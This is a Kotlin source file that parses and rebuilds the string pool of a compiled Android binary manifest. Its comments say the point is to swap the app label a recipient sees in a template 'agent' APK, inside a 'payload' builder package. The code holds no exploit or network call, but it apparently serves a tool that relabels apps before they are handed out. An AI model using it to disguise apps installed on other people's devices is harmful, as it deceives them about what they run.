package com.vector.console.data.payload

import java.io.ByteArrayOutputStream

/**
 * Binary AndroidManifest (`resources.arsc`-style chunked XML) string-pool rewriter.
 *
 * The manifest inside a built APK is not text — it is a chunked binary format whose strings live
 * in a single `ResStringPool` chunk at the front of the file. Every other chunk references those
 * strings by **index**, never by offset, and every offset in the file is relative to the chunk it
 * sits in. That means the pool can be rebuilt with different-length strings and the rest of the
 * document stays valid — the only thing that has to be patched is the root chunk's total size.
 *
 * This is how the builder changes what the recipient sees without shipping a second template:
 * `android:label` is written as a literal string in the template's manifest, so it is a pool
 * entry, so it can be swapped at package time.
 *
 * What this deliberately does **not** do is rename the package. The package name is not only in
 * the manifest — it is baked into `classes.dex` as the descriptor prefix of every class
 * (`Lcom/mobilesvc/agent/MainActivity;`). Rewriting the manifest alone would produce an APK that
 * installs and then dies on launch because the activity it declares does not exist in the DEX.
 * A DEX string-table rewrite is a compiler-shaped problem, so the package is fixed and the
 * builder presents it as a fact instead of a field.
 */
internal object Axml {

    private const val CHUNK_XML = 0x0003
    private const val CHUNK_STRING_POOL = 0x0001
    private const val POOL_UTF8 = 0x0100
    private const val POOL_HEADER_SIZE = 0x001C

    /**
     * Replaces every string in the pool that matches a key of [replacements].
     *
     * Returns [bytes] untouched when there is nothing to do or when the document is not a shape
     * this rewriter understands — a manifest it cannot parse is a build it must not silently
     * corrupt.
     */
    fun rewriteStrings(bytes: ByteArray, replacements: Map<String, String>): ByteArray {
        if (replacements.isEmpty()) return bytes
        val root = readU16(bytes, 0)
        if (root != CHUNK_XML) return bytes
        val rootSize = readU32(bytes, 4)

        var cursor = readU16(bytes, 2).toInt()
        var poolStart = -1
        var poolSize = 0
        while (cursor + 8 <= bytes.size && cursor < rootSize) {
            val type = readU16(bytes, cursor)
            val size = readU32(bytes, cursor + 4)
            if (size <= 0 || cursor + size > bytes.size) return bytes
            if (type == CHUNK_STRING_POOL) {
                poolStart = cursor
                poolSize = size
                break
            }
            cursor += size
        }
        if (poolStart < 0) return bytes

        val rebuilt = rebuildPool(bytes, poolStart, poolSize, replacements) ?: return bytes
        val delta = rebuilt.size - poolSize

        val out = ByteArrayOutputStream(bytes.size + delta)
        out.write(bytes, 0, poolStart)
        out.write(rebuilt)
        out.write(bytes, poolStart + poolSize, bytes.size - poolStart - poolSize)
        val result = out.toByteArray()
        writeU32(result, 4, (rootSize + delta).toLong())
        return result
    }

    /** Reads the pool as plain strings. Exposed for verification and tests. */
    fun strings(bytes: ByteArray): List<String>? {
        if (readU16(bytes, 0) != CHUNK_XML) return null
        var cursor = readU16(bytes, 2).toInt()
        val rootSize = readU32(bytes, 4)
        while (cursor + 8 <= bytes.size && cursor < rootSize) {
            val type = readU16(bytes, cursor)
            val size = readU32(bytes, cursor + 4)
            if (size <= 0 || cursor + size > bytes.size) return null
            if (type == CHUNK_STRING_POOL) return decodePool(bytes, cursor, size)
            cursor += size
        }
        return null
    }

    // ------------------------------------------------------------------ pool

    private fun decodePool(bytes: ByteArray, start: Int, size: Int): List<String>? {
        val headerSize = readU16(bytes, start + 2).toInt()
        if (headerSize != POOL_HEADER_SIZE) return null
        val count = readU32(bytes, start + 8).toInt()
        val styleCount = readU32(bytes, start + 12).toInt()
        if (styleCount != 0) return null
        val flags = readU32(bytes, start + 16).toInt()
        val stringsStart = readU32(bytes, start + 20).toInt()
        if (count < 0 || count > size / 4) return null

        val utf8 = flags and POOL_UTF8 != 0
        val base = start + stringsStart
        val limit = start + size
        return List(count) { index ->
            val offset = readU32(bytes, start + headerSize + index * 4).toInt()
            if (offset < 0 || base + offset >= limit) return null
            if (utf8) readUtf8(bytes, base + offset, limit) ?: return null
            else readUtf16(bytes, base + offset, limit) ?: return null
        }
    }

    private fun rebuildPool(
        bytes: ByteArray,
        start: Int,
        size: Int,
        replacements: Map<String, String>
    ): ByteArray? {
        val headerSize = readU16(bytes, start + 2).toInt()
        if (headerSize != POOL_HEADER_SIZE) return null
        val count = readU32(bytes, start + 8).toInt()
        val styleCount = readU32(bytes, start + 12).toInt()
        if (styleCount != 0) return null
        val flags = readU32(bytes, start + 16).toInt()
        val utf8 = flags and POOL_UTF8 != 0

        val original = decodePool(bytes, start, size) ?: return null
        val strings = original.map { replacements[it] ?: it }
        if (strings == original) return bytes.copyOfRange(start, start + size)

        val data = ByteArrayOutputStream()
        val offsets = IntArray(count)
        strings.forEachIndexed { index, value ->
            offsets[index] = data.size()
            if (utf8) writeUtf8(data, value) else writeUtf16(data, value)
        }
        while (data.size() % 4 != 0) data.write(0)

        val offsetsBytes = count * 4
        val stringsStart = headerSize + offsetsBytes
        val chunkSize = stringsStart + data.size()

        return ByteArrayOutputStream(chunkSize).apply {
            writeU16(this, CHUNK_STRING_POOL)
            writeU16(this, POOL_HEADER_SIZE)
            writeU32(this, chunkSize.toLong())
            writeU32(this, count.toLong())
            writeU32(this, 0) // style count
            writeU32(this, (flags and (POOL_UTF8 or 0x1)).toLong())
            writeU32(this, stringsStart.toLong())
            writeU32(this, 0) // styles start
            offsets.forEach { writeU32(this, it.toLong()) }
            write(data.toByteArray())
        }.toByteArray()
    }

    // -------------------------------------------------------------- encoding

    private fun readUtf8(bytes: ByteArray, at: Int, limit: Int): String? {
        var cursor = at
        val first = bytes[cursor++].toInt() and 0xFF
        val length = if (first and 0x80 != 0) {
            ((first and 0x7F) shl 8) or (bytes[cursor++].toInt() and 0xFF)
        } else {
            first
        }
        if (cursor + length > limit) return null
        return String(bytes, cursor, length, Charsets.UTF_8)
    }

    private fun readUtf16(bytes: ByteArray, at: Int, limit: Int): String? {
        var cursor = at
        val first = readU16(bytes, cursor)
        cursor += 2
        val length = if (first and 0x8000 != 0) {
            ((first and 0x7FFF) shl 16) or readU16(bytes, cursor).also { cursor += 2 }
        } else {
            first
        }
        if (cursor + length * 2 > limit) return null
        return String(bytes, cursor, length * 2, Charsets.UTF_16LE)
    }

    private fun writeUtf8(out: ByteArrayOutputStream, value: String) {
        val encoded = value.toByteArray(Charsets.UTF_8)
        if (encoded.size < 0x80) {
            out.write(encoded.size)
        } else {
            out.write(0x80 or (encoded.size shr 8))
            out.write(encoded.size and 0xFF)
        }
        out.write(encoded)
        out.write(0)
    }

    private fun writeUtf16(out: ByteArrayOutputStream, value: String) {
        val units = value.length
        if (units < 0x8000) {
            writeU16(out, units)
        } else {
            writeU16(out, 0x8000 or (units shr 16))
            writeU16(out, units and 0xFFFF)
        }
        out.write(value.toByteArray(Charsets.UTF_16LE))
        out.write(0)
        out.write(0)
    }

    // ------------------------------------------------------------- byte access

    private fun readU16(bytes: ByteArray, at: Int): Int =
        (bytes[at].toInt() and 0xFF) or ((bytes[at + 1].toInt() and 0xFF) shl 8)

    private fun readU32(bytes: ByteArray, at: Int): Int =
        (bytes[at].toInt() and 0xFF) or
            ((bytes[at + 1].toInt() and 0xFF) shl 8) or
            ((bytes[at + 2].toInt() and 0xFF) shl 16) or
            ((bytes[at + 3].toInt() and 0xFF) shl 24)

    private fun writeU16(out: ByteArrayOutputStream, value: Int) {
        out.write(value and 0xFF)
        out.write((value shr 8) and 0xFF)
    }

    private fun writeU32(out: ByteArrayOutputStream, value: Long) {
        out.write((value and 0xFF).toInt())
        out.write(((value shr 8) and 0xFF).toInt())
        out.write(((value shr 16) and 0xFF).toInt())
        out.write(((value shr 24) and 0xFF).toInt())
    }

    private fun writeU32(bytes: ByteArray, at: Int, value: Long) {
        bytes[at] = (value and 0xFF).toByte()
        bytes[at + 1] = ((value shr 8) and 0xFF).toByte()
        bytes[at + 2] = ((value shr 16) and 0xFF).toByte()
        bytes[at + 3] = ((value shr 24) and 0xFF).toByte()
    }
}
